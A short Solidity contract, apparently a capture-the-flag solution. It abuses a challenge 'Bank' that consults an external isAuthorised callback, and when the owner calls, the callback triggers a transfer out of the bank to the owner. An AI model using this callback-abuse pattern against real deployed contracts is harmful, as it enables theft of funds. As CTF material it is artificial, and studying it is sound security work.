// SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.9;

abstract contract Bank {
    function transfer(address _from, address _to, uint64 _amount) public virtual;
}

contract Solve {
    address owner;
    address bank;

    constructor(address _bank) {
        owner = msg.sender;
        bank = _bank;
    }

    function isAuthorised(address _sender) public returns (bool) {
        if (_sender == owner) {
            Bank(bank).transfer(address(this), owner, 1);
            return (true);
        } else {
            return (_sender == (address(this)));
        }
    }
}
